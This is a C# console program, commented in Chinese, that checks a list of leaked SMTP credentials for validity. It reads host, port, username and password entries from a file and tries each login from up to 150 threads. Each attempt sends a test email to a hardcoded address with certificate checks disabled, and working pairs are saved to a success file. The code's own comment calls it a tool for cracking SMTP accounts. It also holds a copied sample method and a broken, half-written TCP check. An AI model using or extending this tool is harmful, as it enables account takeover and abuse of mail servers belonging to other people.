using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using testTelnet;

/// <summary>
/// 验证正确的smtp
/// </summary>
namespace validateSMTP
{
    class Program
    {
        private static Mutex mutex;
        public delegate void CallBackDelegate(string message);

        static void Main(string[] args)
        {
            mutex = new Mutex();
            var data = GetData();
            var infos = GetSMTPInfo(data);
            AuthenticationSMTP(150, infos);
          
            Console.ReadKey();
            //foreach (var info in infos)
            //{
            //    //SMTPConnet(info);
            //    SMTPAuthentication(info);

            //}
        }


        //用发邮件的形式进行尝试
         





        //读取原始数据
        public static List<string> GetData()
        {
            List<string> result = new List<string>();
            result = File.ReadAllLines("smtp-user-password-data.txt").ToList();
            return result;
        }
        //从数据中分析出 ，邮件服务器，用户名，端口，密码
        public static List<Tuple<string, int, string, string, string>> GetSMTPInfo(List<string> list)
        {
            var result = new List<Tuple<string, int, string, string, string>>();
            foreach (string str in list)
            {
                var _str = str.Replace("|%|", "$");
                var _strs = _str.Split('$');
                var _email = _strs[0];
                var _host = _strs[1];
                var _port = _strs[2];
                var _userName = _strs[4];
                var _password = _strs[5];
                int port = 0;
                if (_host.Length < 4)
                {
                    continue;
                }
                if (!Int32.TryParse(_port, out port))
                {
                    continue;
                }
                if (string.IsNullOrEmpty(_userName))
                {
                    continue;
                }
                if (string.IsNullOrEmpty(_password))
                {
                    continue;
                }
                //验证服务器
                result.Add(new Tuple<string, int, string, string, string>(_host, port, _userName, _password, _email));
            }

            return result;
        }

        //使用SMTP链接
        public static void SendEmail(object param)
        {
            var info = (Tuple<string, int, string, string, string, EventWaitHandle, CallBackDelegate>)param;
            var host = info.Item1;
            var port = info.Item2;
            var userName = info.Item3;
            var password = info.Item4;
            var email = info.Item5;
            var eventWaitHanld = info.Item6;
            CallBackDelegate _callBack = info.Item7 as CallBackDelegate;



            SmtpClient client = new SmtpClient(host, port);
            client.EnableSsl = false;
            client.UseDefaultCredentials = false;

            MailAddress from = new MailAddress(email, userName, System.Text.Encoding.UTF8);
            MailAddress to = new MailAddress("tianmaoyu@foxmail.com");
            MailMessage message = new MailMessage(from, to);
            client.Credentials = new NetworkCredential(userName, password);
            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            client.SendCompleted += new SendCompletedEventHandler(SendCompletedCallback);
            message.Body += Environment.NewLine + "你好";
            message.BodyEncoding = System.Text.Encoding.UTF8;
            message.Subject = "发送测试";
            message.SubjectEncoding = System.Text.Encoding.UTF8;
            try
            {
                //根据验证过程，远程证书无效
                ServicePointManager.ServerCertificateValidationCallback = delegate (Object obj, X509Certificate certificate, X509Chain chain, SslPolicyErrors errors) { return true; };
                client.Send(message);
                //写入如文件
                string str = string.Format("#{0}#|%|#{1}#|%|{2}|%|-1|%|#{3}#|%|#{4}#|%|0|%|0|%|-1|%|", email, host, port, userName, password, email);
                Console.BackgroundColor = ConsoleColor.Blue;
                Console.WriteLine(str + "------SUCCESS");
                SaveSuccessUserAndPassword(str);
            }
            catch (Exception ex)
            {
                string _strFail = string.Format("#{0}#|%|#{1}#|%|{2}|%|-1|%|#{3}#|%|#{4}#|%|0|%|0|%|-1|%|", email, host, port, userName, password);
                Console.BackgroundColor = ConsoleColor.Red;
                Console.WriteLine(_strFail + "-----失败了");
                SaveFailUserAndPassword(_strFail);

            }
            finally
            {
                eventWaitHanld.Set();
            }

        }

        static bool mailSent = false;
        public static void SendCompletedCallback(object sender, AsyncCompletedEventArgs e)
        {
            // Get the unique identifier for this asynchronous operation.
            String token = (string)e.UserState;

            if (e.Cancelled)
            {
                Console.WriteLine("[{0}] 发送取消.", token);
            }
            if (e.Error != null)
            {
                Console.WriteLine("[{0}] {1}", token, e.Error.ToString());
            }
            else
            {
                Console.WriteLine("发送成功.");
            }
            mailSent = true;
        }

        //开启多线程扫描
        /// <summary>
        /// 多线程破解 smtp账号
        /// </summary>
        /// <param name="count">开启的线程数</param>
        /// <param name="emailAndServers"></param>
        public static void AuthenticationSMTP(int count, List<Tuple<string, int, string, string, string>> emailAndServers)
        {
            //最大192个
            if (emailAndServers.Count < 1)
            {
                return;
            }
            var waitsList = new List<List<EventWaitHandle>>();
            var waits = new List<EventWaitHandle>();
            var waits2 = new List<EventWaitHandle>();
            var waits3 = new List<EventWaitHandle>();
            //重邮件文件中取得 count 个邮件放入 运行
            List<Tuple<string, int, string, string, string>> _emailAndServers = emailAndServers;

            //启动的线程为 count * 3 
            for (int i = 0; i < count; i++)
            {
                if (_emailAndServers.Count < 1) break;//邮件已经使用完，返回

                var _emailAndServr = _emailAndServers[0];
                if (_emailAndServr.Item1.Length <= 1)
                {
                    _emailAndServers.Remove(_emailAndServers[0]);//删掉错的
                    continue;
                }

                string host = _emailAndServr.Item1;
                int port = _emailAndServr.Item2;
                string userName = _emailAndServr.Item3;
                string password = _emailAndServr.Item4;
                string email = _emailAndServr.Item5;
                CallBackDelegate callBack = CallBanckForAuthenticationSMTP;
                var handler = new ManualResetEvent(false);
                if (waits.Count < 64)
                {
                    waits.Add(handler);
                }
                var falge2 = waits.Count == 64 && waits2.Count < 64;
                if (falge2)
                {
                    waits2.Add(handler);
                }
                var flage3 = waits2.Count == 64 && waits3.Count < 64;
                if (flage3)
                {
                    waits3.Add(handler);
                }
                //协议认证：SMTPAuthentication，邮件发送：SendEmail
                new Thread(new ParameterizedThreadStart(SendEmail))
                {
                    //线程的名字
                    Name = "线程" + i.ToString()

                }.Start(new Tuple<string, int, string, string, string, EventWaitHandle, CallBackDelegate>(host, port, userName, password, email, handler, callBack));
                //把已经运行的删掉
                _emailAndServers.Remove(_emailAndServers[0]);

            }
            //等待30个线程都结束后继续执行
            if (waits.Count < 1)
            {
                return;
            }
            WaitHandle.WaitAll(waits.ToArray(),6000,false);
            if (waits2.Count > 1)
            {
                WaitHandle.WaitAll(waits.ToArray(), 6000, false);
            }
            if (waits3.Count > 1)
            {
                WaitHandle.WaitAll(waits.ToArray(), 6000, false);
            }
            AuthenticationSMTP(count, _emailAndServers);
        }


        public static void CallBanckForAuthenticationSMTP(string str)
        {
            //进行相应的操作
        }
        //
        //使用smtp 协议进行认证
        public static void SMTPAuthentication(object param)
        {
            var info = (Tuple<string, int, string, string, string, EventWaitHandle, CallBackDelegate>)param;
            var host = info.Item1;
            var port = info.Item2;
            var userName = info.Item3;
            var password = info.Item4;
            var email = info.Item5;
            var eventWaitHanld = info.Item6;
            CallBackDelegate _callBack = info.Item7 as CallBackDelegate;
            try
            {
                //SMTPConnectionWithTimeout smtpConnectionWithTimeout = new SMTPConnectionWithTimeout(host, port, 2000);
                //var result = smtpConnectionWithTimeout.smtpConnectionRun().Login(userName, password, 2000);
                SMTPConnection smtpConnection = new SMTPConnection(host, port);
                var result = smtpConnection.Login(userName, password, 200);
                if (result)
                {
                    //保存结果
                    string str = string.Format("#{0}#|%|#{1}#|%|{2}|%|-1|%|#{3}#|%|#{4}#|%|0|%|0|%|-1|%|", email, host, port, userName, password, email);
                    Console.BackgroundColor = ConsoleColor.Blue;
                    Console.WriteLine(str + "------SUCCESS");
                    SaveSuccessUserAndPassword(str);
                }
                if (!result)
                {
                    //保存结果
                    string str = string.Format("#{0}#|%|#{1}#|%|{2}|%|-1|%|#{3}#|%|#{4}#|%|0|%|0|%|-1|%|", email, host, port, userName, password);
                    Console.BackgroundColor =ConsoleColor.Red;
                    Console.WriteLine(str + "-----失败了");
                    SaveFailUserAndPassword(str);
                }

            }
            catch (Exception ex)
            {

            }
            finally
            {
                eventWaitHanld.Set();
            }

        }


        //把扫描到的密码，账号，密码 保存
        static public void SaveSuccessUserAndPassword(string str)
        {
            mutex.WaitOne();
            using (StreamWriter sw = new StreamWriter("password-userName-success.txt", true, Encoding.Default))
            {
                sw.WriteLine(str);
            }
            mutex.ReleaseMutex();
        }
        static public void SaveFailUserAndPassword(string str)
        {
            mutex.WaitOne();
            using (StreamWriter sw = new StreamWriter("password-userName-fail.txt", true, Encoding.Default))
            {
                sw.WriteLine(str);
            }
            mutex.ReleaseMutex();
        }

        public static void Main2(string[] args)
        {
            // Command line argument must the the SMTP host.
            SmtpClient client = new SmtpClient(args[0]);
           
            // Specify the e-mail sender.
            // Create a mailing address that includes a UTF8 character
            // in the display name.
            MailAddress from = new MailAddress("jane@contoso.com",
               "Jane " + (char)0xD8 + " Clayton",
            System.Text.Encoding.UTF8);
            // Set destinations for the e-mail message.
            MailAddress to = new MailAddress("ben@contoso.com");
            // Specify the message content.
            MailMessage message = new MailMessage(from, to);
            message.Body = "This is a test e-mail message sent by an application. ";
            // Include some non-ASCII characters in body and subject.
            string someArrows = new string(new char[] { '\u2190', '\u2191', '\u2192', '\u2193' });
            message.Body += Environment.NewLine + someArrows;
            message.BodyEncoding = System.Text.Encoding.UTF8;
            message.Subject = "test message 1" + someArrows;
            message.SubjectEncoding = System.Text.Encoding.UTF8;
            // Set the method that is called back when the send operation ends.
            client.SendCompleted += new
            SendCompletedEventHandler(SendCompletedCallback);
            // The userState can be any object that allows your callback 
            // method to identify this send operation.
            // For this example, the userToken is a string constant.
            string userState = "test message1";
            client.SendAsync(message, userState);
            Console.WriteLine("Sending message... press c to cancel mail. Press any other key to exit.");
            string answer = Console.ReadLine();
            // If the user canceled the send, and mail hasn't been sent yet,
            // then cancel the pending operation.
            if (answer.StartsWith("c") && mailSent == false)
            {
                client.SendAsyncCancel();
            }
            // Clean up.
            message.Dispose();
            Console.WriteLine("Goodbye.");
        }


        /// <summary>
        /// 是用TCP 邮件
        /// </summary>
        /// <param name="mailAddress"></param>
        /// <param name="port"></param>
        /// <param name="errorInfo"></param>
        /// <returns></returns>
        public int CheckEmail(string host, int port, out string errorInfo)
        {

            TcpClient tcpc = new TcpClient();
            tcpc.NoDelay = true;
            tcpc.ReceiveTimeout = 2000;
            tcpc.SendTimeout = 2000;
            try
            {
                //服务器地址
                tcpc.Connect(host, port);
                NetworkStream ns = tcpc.GetStream();
                StreamReader sr = new StreamReader(ns, Encoding.Default);
                StreamWriter sw = new StreamWriter(ns, Encoding.Default);
                string strResponse = "";
                //发送
                sw.WriteLine("helo " + host);

                //sw.WriteLine("mail from:<" + mailAddress + ">");
                //sw.WriteLine("rcpt to:<" + strTestFrom + ">");
                strResponse = sr.ReadLine();
                //返回包含25的
                sw.WriteLine("auth login");
                //返回334 VXN1cm5hbWU6
                strResponse = sr.ReadLine();
                //输入用户面的 base64
                //SendDataToServer("")

                byte[] b = System.Text.Encoding.Default.GetBytes("");
                var useName64 = Convert.ToBase64String(b);

                //输入密码对应的base64
                sw.WriteLine("auth login");
                //如果正确则返回 235 Authentication successful
                //认证成功
                if (!strResponse.StartsWith("2"))
                {
                    errorInfo = "UserName error!";
                    //
                    return 200;
                }
                sw.WriteLine("quit");
                errorInfo = String.Empty;
                return 200;
                ns.Close();
                sr.Close();
                sw.Close();
            }
            catch (Exception ee)
            {
                errorInfo = ee.Message.ToString();
                return 403;
            }
            finally
            {

            }
        }
    }
}
